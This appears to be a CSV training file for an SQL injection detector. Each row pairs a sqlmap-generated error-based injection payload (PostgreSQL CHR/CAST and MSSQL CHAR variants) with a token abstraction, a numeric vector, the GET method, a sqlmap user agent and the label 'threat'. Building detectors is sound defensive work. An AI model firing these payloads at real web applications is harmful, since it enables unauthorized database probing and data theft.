payload,token,centrality,requestmethod,uagent,label
1' AND 3182=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3182=3182) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC) AND 'Dlhb' LIKE 'Dlhb,INT SQUT AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND SQUT STR SQUT LIKE SQUT STR,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") AND 3182=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3182=3182) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC) AND (""HZuP""=""HZuP",INT DQUT RPRN AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND LPRN DQUT STR DQUT EQ DQUT STR,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") AND 3182=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3182=3182) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC) AND (""HZuP""=""HZuP",INT DQUT RPRN AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND LPRN DQUT STR DQUT EQ DQUT STR,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"" AND 3182=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3182=3182) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC) AND ""Wsoi""=""Wsoi",INT DQUT AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND DQUT STR DQUT EQ DQUT STR,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"" AND 3182=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3182=3182) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC) AND ""Wsoi""=""Wsoi",INT DQUT AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND DQUT STR DQUT EQ DQUT STR,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%') AND 3182=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3182=3182) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC) AND ('%'=',INT PRCNT SQUT RPRN AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND LPRN SQUT PRCNT SQUT EQ SQUT,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%') AND 3182=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3182=3182) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC) AND ('%'=',INT PRCNT SQUT RPRN AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND LPRN SQUT PRCNT SQUT EQ SQUT,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%' AND 3182=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3182=3182) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC) AND '%'=',INT PRCNT SQUT AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND SQUT PRCNT SQUT EQ SQUT,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%' AND 3182=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3182=3182) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC) AND '%'=',INT PRCNT SQUT AND INT EQ CAST CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END CLN CLN TEXT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AS NUMERIC AND SQUT PRCNT SQUT EQ SQUT,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1) AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND (5809=5809,INT RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN INT EQ INT,0.07547169811320754 0.09433962264150943 0.11320754716981132 0.1320754716981132 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1509433962264151 0.1320754716981132 0.11320754716981132 0.09433962264150943 0.07547169811320754,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1 AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))),INT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT,0.0851063829787234 0.10638297872340426 0.1276595744680851 0.14893617021276595 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.1702127659574468 0.14893617021276595 0.1276595744680851 0.10638297872340426 0.0851063829787234,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND ('wfPv'='wfPv,INT SQUT RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN SQUT STR SQUT EQ SQUT STR,0.07017543859649122 0.08771929824561403 0.10526315789473684 0.12280701754385964 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.12280701754385964 0.10526315789473684 0.08771929824561403 0.07017543859649122,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND ('wfPv'='wfPv,INT SQUT RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN SQUT STR SQUT EQ SQUT STR,0.07017543859649122 0.08771929824561403 0.10526315789473684 0.12280701754385964 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.14035087719298245 0.12280701754385964 0.10526315789473684 0.08771929824561403 0.07017543859649122,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1')) AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND (('vvzE'='vvzE,INT SQUT RPRN RPRN AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.06779661016949153 0.0847457627118644 0.1016949152542373 0.11864406779661017 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.13559322033898305 0.11864406779661017 0.1016949152542373 0.0847457627118644 0.06779661016949153,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND 'KfYp'='KfYp,INT SQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND SQUT STR SQUT EQ SQUT STR,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' AND 8633 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8633=8633) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(113)+CHAR(113))) AND 'KfYp'='KfYp,INT SQUT AND INT IN SELECT CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS SELECT CASE WHEN INT EQ INT THEN CHAR INT ELSE CHAR INT END PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT PLUS CHAR INT AND SQUT STR SQUT EQ SQUT STR,0.07272727272727272 0.09090909090909091 0.10909090909090909 0.12727272727272726 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.14545454545454545 0.12727272727272726 0.10909090909090909 0.09090909090909091 0.07272727272727272,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
